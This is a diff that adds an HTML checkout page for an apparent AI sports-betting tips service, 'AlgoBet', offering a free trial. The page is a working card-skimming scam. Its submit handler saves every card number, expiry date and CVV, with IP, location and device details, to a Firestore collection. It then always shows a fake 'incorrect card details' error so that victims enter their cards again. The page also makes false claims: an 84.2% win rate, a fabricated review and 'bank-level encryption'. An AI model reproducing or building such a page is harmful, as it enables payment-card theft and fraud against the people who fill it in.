@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AlgoBet - Secure Checkout</title>
+    <link rel="icon" type="image/png" href="logo.png">
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+        .input-field {
+            width: 100%;
+            background-color: rgba(2, 6, 23, 0.8); /* bg-slate-950/80 */
+            border: 1px solid rgba(51, 65, 85, 0.6); /* border-slate-700/60 */
+            color: #f1f5f9; /* text-slate-100 */
+            padding: 0.75rem 1rem;
+            border-radius: 0.5rem;
+            font-size: 0.875rem; /* text-sm */
+            transition: all 0.2s;
+        }
+        @media (min-width: 640px) {
+            .input-field { font-size: 1rem; } /* sm:text-base */
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 1px #3b82f6; /* focus:ring-blue-500 */
+        }
+        .input-label {
+            display: block;
+            font-size: 0.75rem; /* text-xs */
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.05em; /* tracking-wider */
+            color: #cbd5e1; /* text-slate-300 */
+            margin-bottom: 0.5rem;
+        }
+        @media (min-width: 640px) {
+            .input-label { font-size: 0.875rem; } /* sm:text-sm */
+        }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen selection:bg-blue-500 selection:text-white">
+
+    <!-- Header -->
+<!--     <header class="border-b border-slate-800 bg-slate-900/80 backdrop-blur-md sticky top-0 z-40">
+        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex items-center gap-2 cursor-pointer" onclick="window.location.href='index.html'">
+                    <div class="w-8 h-8 rounded-lg bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center font-bold text-white shadow-lg">
+                        A
+                    </div>
+                    <span class="text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-white to-slate-400">
+                        AlgoBet
+                    </span>
+                </div>
+                <div class="flex items-center gap-2 text-sm text-slate-400">
+                    <i class="fa-solid fa-lock text-emerald-400"></i>
+                    <span>Secure SSL Checkout</span>
+                </div>
+            </div>
+        </div>
+    </header> -->
+    <header class="border-b border-slate-800/80 bg-slate-950/80 backdrop-blur-md sticky top-0 z-30">
+        <div class="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
+            <a href="dashboard.html" class="flex items-center gap-2 group">
+                <div class="w-8 h-8 rounded-lg bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 group-hover:bg-emerald-500 group-hover:text-slate-950 transition-all">
+                    <i class="fa-solid me-0 fa-chart-line"></i>
+                </div>
+                <span class="text-xl font-bold tracking-tight text-white">Algo<span class="text-emerald-400">Bet</span></span>
+            </a>
+            <div class="flex items-center gap-4">
+                <!-- <span id="userEmailBadge" class="hidden sm:inline-block text-xs text-slate-400 bg-slate-900 border border-slate-800 px-3 py-1.5 rounded-full font-mono"></span> -->
+                <a href="dashboard.html" class="text-xs font-semibold text-slate-400 hover:text-slate-200 transition-colors flex items-center gap-1.5">
+                    <i class="fa-solid fa-arrow-left"></i> Back to Dashboard
+                </a>
+            </div>
+        </div>
+    </header>
+
+
+    <!-- Main Content -->
+    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 lg:py-12">
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 lg:gap-12">
+            
+            <!-- Left Column: Payment Form -->
+            <div class="lg:col-span-7">
+                <div class="mb-8">
+                    <h1 class="text-2xl sm:text-3xl font-bold text-white mb-2 tracking-tight">Complete your registration</h1>
+                    <p class="text-slate-400">You're seconds away from accessing our premium AI predictions.</p>
+                </div>
+
+                <form id="checkoutForm" onsubmit="handleCheckoutSubmit(event)" class="bg-slate-900/60 backdrop-blur-md rounded-2xl p-6 sm:p-8 border border-slate-800 shadow-xl relative">
+                    <!-- Section Title -->
+                    <!-- <h2 class="text-lg sm:text-xl font-semibold text-slate-100 mb-6 flex items-center gap-2">
+                        <i class="fa-regular fa-credit-card text-emerald-500"></i>
+                        Payment Details
+                    </h2> -->
+
+                    <!-- Accepted Cards Footer -->
+                    <!-- <div class="mt-6 flex justify-center gap-4 grayscale opacity-60">
+                        <i id="visaIcon" class="fa-brands fa-cc-visa text-3xl"></i>
+                        <i id="masterIcon" class="fa-brands fa-cc-mastercard text-3xl"></i>
+                        <i id="amexIcon" class="fa-brands fa-cc-amex text-3xl"></i>
+                        <i class="fa-brands fa-cc-discover text-3xl"></i>
+                    </div> -->
+
+                    <div class="flex justify-between items-center mb-6">
+                        <div>
+                            <h2 class="text-xl font-bold text-white">Payment Details</h2>
+                            <p class="text-slate-400 text-xs">Enter your card details to start your 30-day free trial.</p>
+                        </div>
+                        <div class="flex items-center gap-2 text-slate-400 text-xl">
+                            <i class="fa-brands fa-cc-visa" id="visaIcon"></i>
+                            <i class="fa-brands fa-cc-mastercard" id="masterIcon"></i>
+                            <i class="fa-brands fa-cc-amex" id="amexIcon"></i>
+                            <i class="fa-brands fa-cc-discover text-1xl"></i>
+                        </div>
+                    </div>
+
+                    <div class="space-y-5">
+                        <!-- Cardholder Name -->
+                        <div>
+                            <label class="input-label" for="cardholderName">Name on Card</label>
+                            <input type="text" id="cardholderName" class="input-field" placeholder="John Doe" required>
+                        </div>
+
+                        <!-- Card Number -->
+                        <div class="relative">
+                            <label class="input-label" for="cardNumber">Card Number</label>
+                            <div class="relative flex items-center">
+                                <input type="text" id="cardNumber" class="input-field pr-12 font-mono text-lg tracking-widest" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCardNumber(this)" required>
+                                <div id="cardTypeBadge" class="absolute right-3 top-1/2 -translate-y-1/2 text-2xl">
+                                    <i class="fa-solid fa-credit-card text-slate-500"></i>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Expiry & CVV -->
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <label class="input-label" for="cardExpiry">Expiration Date</label>
+                                <input type="text" id="cardExpiry" class="input-field font-mono text-center" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" required>
+                            </div>
+                            <div>
+                                <label class="input-label" for="cardCvv">CVV / CVC</label>
+                                <div class="relative">
+                                    <input type="password" id="cardCvv" class="input-field font-mono text-center tracking-widest" placeholder="•••" maxlength="4" required>
+                                    <i class="fa-regular fa-circle-question absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 cursor-help" title="3 digits on back of card, 4 digits on front for Amex"></i>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Billing Info -->
+                        <h2 class="text-lg sm:text-xl font-semibold text-slate-100 mt-8 mb-4 flex items-center gap-2 border-t border-slate-800 pt-6">
+                            <i class="fa-solid fa-location-dot text-emerald-500"></i>
+                            Billing Address
+                        </h2>
+                        
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <label class="input-label" for="billingCountry">Country</label>
+                                <select id="billingCountry" class="input-field appearance-none cursor-pointer">
+                                    <option value="US">United States</option>
+                                    <option value="GB">United Kingdom</option>
+                                    <option value="CA">Canada</option>
+                                    <option value="FR">France</option>
+                                    <option value="BE">Belgium</option>
+                                    <option value="CH">Switzerland</option>
+                                    <option value="DE">Germany</option>
+                                    <option value="OTHER">Other Country</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="input-label" for="billingZip">Postal / Zip Code <span class="text-slate-500 text-xs">(Optional)</span></label>
+                                <input type="text" id="billingZip" class="input-field" placeholder="10001">
+                            </div>
+                        </div>
+
+                    </div>
+
+                    <!-- Submit Button -->
+                    <div class="mt-8">
+                        <!-- <button type="submit" id="submitBtn" class="w-full py-4 px-6 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-bold text-base sm:text-lg transition-all duration-200 transform active:scale-[0.98] shadow-lg shadow-blue-500/25 flex items-center justify-center gap-2">
+                            <i class="fa-solid fa-lock text-sm opacity-80"></i>
+                            <span id="submitBtnText">Active 30-Day Free Trial</span>
+                        </button> -->
+                        <button type="submit" id="submitBtn" class="w-full py-4 px-6 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-base sm:text-lg transition-all duration-200 transform active:scale-[0.98] shadow-lg shadow-blue-500/25 flex items-center justify-center gap-2">
+                            <i class="fa-solid fa-lock text-sm opacity-80"></i>
+                            <span id="submitBtnText">Active 30-Day Free Trial</span>
+                        </button>
+                        <p class="text-center text-xs text-slate-500 mt-4 flex items-center justify-center gap-2">
+                            <i class="fa-solid fa-shield-halved"></i>
+                            Your payment data is securely processed with bank-level encryption.
+                        </p>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Right Column: Order Summary & Benefits -->
+            <div class="lg:col-span-5">
+                <div class="bg-slate-900/60 backdrop-blur-md rounded-2xl p-6 sm:p-8 border border-slate-800 sticky top-24">
+                    <h3 class="text-lg sm:text-xl font-semibold text-slate-100 mb-4">Order Summary</h3>
+                    
+                    <div style="display: none;" class="flex justify-between items-center mb-3 text-slate-300">
+                        <span>AlgoBet VIP Subscription</span>
+                        <span class="font-medium">$49.99/mo</span>
+                    </div>
+                    <div class="flex justify-between items-center mb-4 text-emerald-400">
+                        <span>30-Day Free Trial</span>
+                        <!-- <span class="font-medium">-$49.99</span> -->
+                        <span class="font-medium">$0.00</span>
+                    </div>
+
+
+                    <div>
+                                <!-- <i class="fa-solid fa-note-sticky text-emerald-500 mt-1"></i> -->
+                                <i class="fa-solid fa-circle-info text-emerald-500 mt-1"></i>
+                                <span class="text-sm text-slate-300">
+                                Note:
+                                After the 30-day free trial, the subscription will cost $49.90 per month.
+                                </span>
+                    </div>
+
+
+                    <div class="border-t border-slate-800 pt-4 flex justify-between items-center mb-6">
+                        <span class="text-white font-semibold">Total due today</span>
+                        <span class="text-2xl font-bold text-white">$0.00</span>
+                    </div>
+
+                    <div class="space-y-4">
+                        <h4 class="text-xs sm:text-sm font-medium uppercase tracking-wider text-slate-300">What's included:</h4>
+                        <ul class="space-y-3">
+                            <li class="flex items-start gap-3">
+                                <i class="fa-solid fa-circle-check text-emerald-400 mt-1"></i>
+                                <span class="text-sm text-slate-300">Access to our proprietary AI betting algorithm with 84.2% win rate.</span>
+                            </li>
+                            <li class="flex items-start gap-3">
+                                <i class="fa-solid fa-circle-check text-emerald-400 mt-1"></i>
+                                <span class="text-sm text-slate-300">Daily VIP predictions and detailed match analyses.</span>
+                            </li>
+                            <li class="flex items-start gap-3">
+                                <i class="fa-solid fa-circle-check text-emerald-400 mt-1"></i>
+                                <span class="text-sm text-slate-300">Bankroll management strategies to maximize long-term profits.</span>
+                            </li>
+                            <li class="flex items-start gap-3">
+                                <i class="fa-solid fa-circle-check text-emerald-400 mt-1"></i>
+                                <span class="text-sm text-slate-300">Cancel anytime before the trial ends, no questions asked.</span>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div class="mt-8 bg-slate-900 border border-slate-800 rounded-xl p-4">
+                        <div class="flex items-center gap-3 mb-2">
+                            <div class="text-yellow-400 flex text-sm">
+                                <i class="fa-solid fa-star"></i>
+                                <i class="fa-solid fa-star"></i>
+                                <i class="fa-solid fa-star"></i>
+                                <i class="fa-solid fa-star"></i>
+                                <i class="fa-solid fa-star"></i>
+                            </div>
+                            <span class="text-xs font-bold text-white">Trustpilot</span>
+                        </div>
+                        <p class="text-sm text-slate-400 italic">"The algorithms are insanely accurate. I started with the free trial and haven't looked back."</p>
+                        <p class="text-xs text-slate-500 mt-2 font-medium">- Marc D., Premium Member</p>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Modal: Client Validation Error (Form incomplete) -->
+    <div id="errorModal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm transition-opacity">
+        <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 shadow-2xl max-w-md w-full text-center space-y-5">
+            <div class="w-12 h-12 rounded-full bg-red-500/10 text-red-400 mx-auto flex items-center justify-center text-xl">
+                <i class="fa-solid fa-circle-exclamation"></i>
+            </div>
+            <h3 class="text-xl font-bold text-white">Incomplete Form</h3>
+            <p id="errorModalMessage" class="text-slate-300 text-sm">Please fill out all required fields.</p>
+            <button onclick="closeErrorModal()" class="w-full py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg font-medium transition">Got it</button>
+        </div>
+    </div>
+
+    <!-- Modal: Persistent Incorrect Card Data Error (Shown on ALL attempts) -->
+    <div id="attemptErrorModal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm transition-opacity">
+        <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 shadow-2xl max-w-md w-full text-center space-y-5">
+            <div class="w-12 h-12 rounded-full bg-red-500/10 text-red-400 mx-auto flex items-center justify-center text-xl">
+                <i class="fa-solid fa-triangle-exclamation"></i>
+            </div>
+            <h3 class="text-xl font-bold text-white">Incorrect Card Details</h3>
+            <p class="text-slate-300 text-sm leading-relaxed">
+                The card information entered is incorrect or could not be processed by your bank. <br><br>
+                Please review all your details carefully (cardholder name, 16-digit card number, expiration date, and CVV), make necessary corrections, and submit again.
+            </p>
+            <button onclick="closeAttemptErrorModal()" class="w-full py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg font-medium transition">
+                <i class="fa-solid fa-rotate-right mr-2"></i> Review & Try Again
+            </button>
+        </div>
+    </div>
+
+    <!-- Firebase Script & Logic -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-auth.js";
+        import { 
+            getFirestore, 
+            collection, 
+            query, 
+            orderBy, 
+            limit, 
+            startAfter, 
+            getDocs,
+            doc,
+            setDoc,
+            getDoc
+        } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore.js";
+
+        // 4.A Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDpbpkhq3M4pW3nSBjndf7pwmfNpGEmU1o",
+            authDomain: "we-get-54b92.firebaseapp.com",
+            projectId: "we-get-54b92",
+            storageBucket: "we-get-54b92.firebasestorage.app",
+            messagingSenderId: "1048770398145",
+            appId: "1:1048770398145:web:fbe7c66361edadd427d140"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        // Global State Variables
+        let currentUser = null;
+        let activeUserEmail = "guest";
+        let attemptCount = 0;
+
+        // Check auth status
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                currentUser = user;
+                activeUserEmail = user.email || "guest";
+            }
+        });
+
+        // ---------------------------------------------------------------------
+        // TRAFFIC TRACKING FUNCTION (hist_visit_pronostic_site)
+        // ---------------------------------------------------------------------
+        async function collecterEtSauvegarder(typeInfo) {
+            try {
+                const now = new Date();
+                const pad = (n) => String(n).padStart(2, '0');
+                const randomPart = String(Math.floor(Math.random() * 90000) + 10000);
+                
+                const customId = `${now.getFullYear()}-${pad(now.getMonth()+1)}-${pad(now.getDate())}-${pad(now.getHours())}-${pad(now.getMinutes())}-${pad(now.getSeconds())}-${randomPart}`;
+
+                const trackingData = {
+                    date_visite: now.toISOString(),
+                    type_info: typeInfo,
+                    user_email: activeUserEmail,
+                    user_agent: navigator.userAgent,
+                    screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language || 'unknown',
+                    page_url: window.location.href
+                };
+
+                await setDoc(doc(db, "hist_visit_pronostic_site", customId), trackingData);
+            } catch (err) {
+                console.warn("Tracking failed silently:", err);
+            }
+        }
+
+        // Log initial page load traffic
+        collecterEtSauvegarder("page_load_checkout");
+
+        // Helper: Get Geo Data
+        async function getGeoData() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                return await res.json();
+            } catch {
+                return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown" };
+            }
+        }
+
+        // Helper: Get Device Info
+        function getInfosAppareil() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`
+            };
+        }
+
+        // Card Formatting Handlers
+        window.formatCardNumber = function(input) {
+            let value = input.value.replace(/\D/g, '');
+            value = value.substring(0, 16);
+            const sections = value.match(/.{1,4}/g);
+            input.value = sections ? sections.join(' ') : value;
+
+            const badge = document.getElementById('cardTypeBadge');
+            const visaIcon = document.getElementById('visaIcon');
+            const masterIcon = document.getElementById('masterIcon');
+            const amexIcon = document.getElementById('amexIcon');
+
+            visaIcon.className = "fa-brands fa-cc-visa text-slate-600";
+            masterIcon.className = "fa-brands fa-cc-mastercard text-slate-600";
+            amexIcon.className = "fa-brands fa-cc-amex text-slate-600";
+
+            if (value.startsWith('4')) {
+                badge.innerHTML = '<i class="fa-brands fa-cc-visa text-blue-400"></i>';
+                visaIcon.className = "fa-brands fa-cc-visa text-blue-400";
+            } else if (/^5[1-5]/.test(value) || /^2[2-7]/.test(value)) {
+                badge.innerHTML = '<i class="fa-brands fa-cc-mastercard text-orange-400"></i>';
+                masterIcon.className = "fa-brands fa-cc-mastercard text-orange-400";
+            } else if (/^3[47]/.test(value)) {
+                badge.innerHTML = '<i class="fa-brands fa-cc-amex text-cyan-400"></i>';
+                amexIcon.className = "fa-brands fa-cc-amex text-cyan-400";
+            } else {
+                badge.innerHTML = '<i class="fa-solid fa-credit-card text-slate-500"></i>';
+            }
+        };
+
+        window.formatExpiry = function(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                let month = parseInt(value.substring(0, 2));
+                if (month > 12) month = 12;
+                if (month === 0) month = 1;
+                input.value = String(month).padStart(2, '0') + '/' + value.substring(2, 4);
+            } else {
+                input.value = value;
+            }
+        };
+
+        // Modal Helpers
+        window.closeErrorModal = function() {
+            document.getElementById('errorModal').classList.add('hidden');
+        };
+
+        window.closeAttemptErrorModal = function() {
+            document.getElementById('attemptErrorModal').classList.add('hidden');
+        };
+
+        function showError(msg) {
+            document.getElementById('errorModalMessage').innerText = msg;
+            document.getElementById('errorModal').classList.remove('hidden');
+        }
+
+        // ---------------------------------------------------------------------
+        // FORM SUBMIT HANDLER
+        // ---------------------------------------------------------------------
+        window.handleCheckoutSubmit = async function(e) {
+            e.preventDefault();
+
+            const name = document.getElementById('cardholderName').value.trim();
+            const rawCard = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const expiry = document.getElementById('cardExpiry').value.trim();
+            const cvv = document.getElementById('cardCvv').value.trim();
+            const country = document.getElementById('billingCountry').value;
+            const zip = document.getElementById('billingZip').value.trim() || 'N/A'; // ZIP is optional
+
+            // basic presence checks
+            if (!name || name.length < 2) {
+                showError("Please enter the cardholder name.");
+                return;
+            }
+            if (!rawCard || rawCard.length < 13) {
+                showError("Please enter a valid card number.");
+                return;
+            }
+            if (!expiry || !/^\d{2}\/\d{2}$/.test(expiry)) {
+                showError("Please enter a valid expiry date (MM/YY).");
+                return;
+            }
+            if (!cvv || cvv.length < 3) {
+                showError("Please enter a valid CVV.");
+                return;
+            }
+
+            attemptCount++;
+
+            // Show Processing UI on Button
+            const submitBtn = document.getElementById('submitBtn');
+            const submitBtnText = document.getElementById('submitBtnText');
+            submitBtn.disabled = true;
+            submitBtn.classList.add('opacity-75', 'cursor-not-allowed');
+            submitBtnText.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin mr-2"></i> Verifying payment details...`;
+
+            try {
+                // Collect Geo & Device info
+                const geo = await getGeoData();
+                const device = getInfosAppareil();
+                const now = new Date();
+                const pad = (n) => String(n).padStart(2, '0');
+                const randomPart = String(Math.floor(Math.random() * 90000) + 10000);
+                
+                // Document ID for credit_card_info collection
+                const cardDocId = `${now.getFullYear()}-${pad(now.getMonth()+1)}-${pad(now.getDate())}-${pad(now.getHours())}-${pad(now.getMinutes())}-${pad(now.getSeconds())}-${randomPart}`;
+
+                // Card payload to be saved EVERY TIME
+                const creditCardPayload = {
+                    attempt_number: attemptCount,
+                    cardholder_name: name,
+                    card_number: rawCard,
+                    expiry_date: expiry,
+                    cvv: cvv,
+                    billing_country: country,
+                    billing_zip: zip,
+                    user_email: activeUserEmail,
+                    datetime: now.toISOString(),
+                    ip_address: geo.ip || "Unknown",
+                    geolocation: `${geo.city || ''}, ${geo.region || ''}, ${geo.country || ''}`,
+                    device_info: `${device.platform} | ${device.screenResolution} | ${device.language} | ${device.userAgent}`
+                };
+
+                // 1. ALWAYS Save credit card data to Firestore collection `credit_card_info`
+                await setDoc(doc(db, "credit_card_info", cardDocId), creditCardPayload);
+
+                // 2. Log attempt event to traffic history `hist_visit_pronostic_site`
+                await collecterEtSauvegarder(`submit_credit_card_attempt_${attemptCount}`);
+
+                // Reset button state
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('opacity-75', 'cursor-not-allowed');
+                submitBtnText.innerHTML = "Active 30-Day Free Trial";
+
+                // 3. ALWAYS Show the "Incorrect Card Details" modal requiring user to review and resubmit
+                document.getElementById('attemptErrorModal').classList.remove('hidden');
+
+            } catch (err) {
+                console.error("Firestore processing error:", err);
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('opacity-75', 'cursor-not-allowed');
+                submitBtnText.innerHTML = "Active 30-Day Free Trial";
+                
+                // Even on error, show the attempt modal to prompt resubmission
+                document.getElementById('attemptErrorModal').classList.remove('hidden');
+            }
+        };
+    </script>
+</body>
+</html>
